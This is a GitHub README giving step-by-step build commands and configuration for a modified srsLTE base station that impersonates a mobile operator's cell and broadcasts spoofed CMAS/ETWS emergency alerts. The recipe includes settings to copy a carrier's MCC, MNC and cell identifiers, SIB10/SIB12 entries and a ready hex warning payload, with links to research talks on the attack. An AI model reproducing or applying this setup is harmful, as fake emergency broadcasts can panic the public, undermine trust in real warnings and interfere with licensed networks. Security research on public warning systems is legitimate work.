# srsLTE_CMAS_ETWS_Hacking
## INSTALLATION :
Inspired at : https://docs.srsran.com/projects/4g/en/next/app_notes/source/pi4/source/index.html  
  
  
  
  
  
sudo apt-get install build-essential cmake libfftw3-dev libmbedtls-dev libboost-program-options-dev libconfig++-dev libsctp-dev  
apt-get install git  

sudo apt-get install libuhd-dev libuhd3.15.0 uhd-host  

/usr/lib/uhd/utils/uhd_images_downloader.py

git clone https://github.com/learning-lte/srsLTE_cmas_etws  

cd srsLTE_cmas_etws  
mkdir build  
cd build  
cmake ..  
make -j4
make install
ldconfig  

## CONFIG : 
AT /etc/srslte/enb.conf
You need to configure enb_id, MCC, MNC and n_prb as same as operator 
[enb]  
enb_id = 0x19B  
mcc = 001  
mnc = 01  
n_prb = 50  

NOTED : SRSRAN SUPPORT NOW MULTICELL SO TAC AND PCI IS NOT AT /etc/srslte/enb.conf
AT /etc/srslte/rr.conf
You need to configure tac and pci : 
    // Cells available for handover
    meas_cell_list =
    (
      {
        eci = 0x19C02;
        dl_earfcn = 2850;
        pci = 2;
        //direct_forward_path_available = false;
        //allowed_meas_bw = 6;
        //cell_individual_offset = 0;
      }
    );



## IMPORTANT CONFIG :  
replace config at /etc/srslte/sib.conf as :  
https://github.com/learning-lte/srsLTE_cmas_etws/commit/88775bb3bd133344a1b6f2248510a68b0ea9f547  

sib10 =  
{  
    message_identifier = 0x1104;  
    serial_number = 0x3000;  
    warning_type = "0x580";  
}   


sib12 =  
{  
    message_identifier = 0x1112;  
    serial_number = 0x3000;  
    data_coding_scheme = 01;  
    warning_msg_segment_type = "lastSegment";  
    warning_msg_segment_num = 0;  
    warning_msg_segment_r9 = "01C576597E2EBBC7F950A8D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D1000A";   
 };  
 
## GENERATING THIS PDU : 01C576597E2EBBC7F950A8D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D168341A8D46A3D1000A
* Follow this tutorial : https://www.sharetechnote.com/html/Handbook_LTE_CMAS.html
* Tools for generating PDU : http://smstools3.kekekasvi.com/topic.php?id=288

## COMPARING PDU AND FILE CONFIG OF SRSLTE
<img src="https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/HexWarningMsg1.jpg" width="1500px" align="center">
## <p align="center"> VS </p>
<img src="https://github.com/SitrakaResearchAndPOC/srsLTE_CMAS_ETWS_Hacking/blob/main/HexWarningMsg2.jpg" width="1500px" align="center">

## DOCUMENTATIONS
* https://www.youtube.com/watch?v=EP1PnzMUaCg
* https://hackmd.io/@AIS3-official/Critical-Infra-day5#spoofing-wireless-emergency-alerts-attack
* https://www.leg.ba/public-warning-systems-in-mobile-networks/
* https://conference.hitb.org/hitbsecconf2019ams/materials/HAXPO%20D1%20-%20Hacking%20LTE%20Public%20Warning%20Systems%20-%20Weiguang%20Li.pdf

